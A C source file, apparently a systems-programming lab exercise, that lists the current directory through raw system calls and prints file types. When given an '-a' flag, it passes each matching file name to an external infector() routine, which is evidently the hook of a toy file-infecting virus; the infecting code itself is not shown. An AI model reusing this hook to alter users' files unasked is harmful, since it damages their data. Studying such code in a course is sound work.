extern int system_call();
#include "util.h"
extern void infection();
extern void infector();
extern void code_start();
extern void code_end();

#define STDOUT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_GETD 141
#define exitSafe system_call(1,0x55)
#define Prefix "-p"
#define Attach "-a"

typedef struct ent{
    int inode;
    int offset;
    short len;
    char buf[1];
}ent;

char *types[]= {"0","DT_FIFO","DT_CHR","3","DT_DIR","5","DT_BLK","7","DT_REG","9","DT_LNK","11","DT_SOCK","13","DT_WHT"};

int main (int argc , char* argv[], char* envp[])
{
    int acc=0, bytesRead, curDir, i;
    char printPreFix,attachPreFix, typeNum;
    char buffer[8192];
    ent *dirptr;
    for (i = 1 ; i < argc ; i++){
        if (strncmp(Prefix,argv[i],2) == 0) printPreFix = argv[i][2];
        if (strncmp(Attach,argv[i],2) == 0) attachPreFix = argv[i][2];
    }
    curDir=system_call(SYS_OPEN,".",0,0);
    if (curDir <= 0 ) exitSafe;
    bytesRead = system_call(SYS_GETD,curDir,buffer,8192);
    if (bytesRead <= 0 ) exitSafe;
    /*
    continue printing until all the file names are printed
    according to the acc variable and bytesRead amount
    */
    while (acc<bytesRead){
        dirptr = (ent *)(buffer+acc);
        if ((attachPreFix && dirptr->buf[0] == attachPreFix) || (printPreFix && dirptr->buf[0] == printPreFix) || (!printPreFix && !attachPreFix)){
            system_call(SYS_WRITE,STDOUT,dirptr->buf,strlen(dirptr->buf));
            if (printPreFix || attachPreFix) {
                system_call(SYS_WRITE,STDOUT," Type: ",7);
                typeNum = ((buffer+acc)[dirptr->len-1]);
                system_call(SYS_WRITE,STDOUT,types[(int)typeNum],strlen(types[(int)typeNum]));
            }
            system_call(SYS_WRITE,STDOUT,"\n",1);
            if(attachPreFix) infector(dirptr->buf);
        }
        acc += dirptr->len;
    }
    system_call(SYS_CLOSE,curDir);
    return 0;
}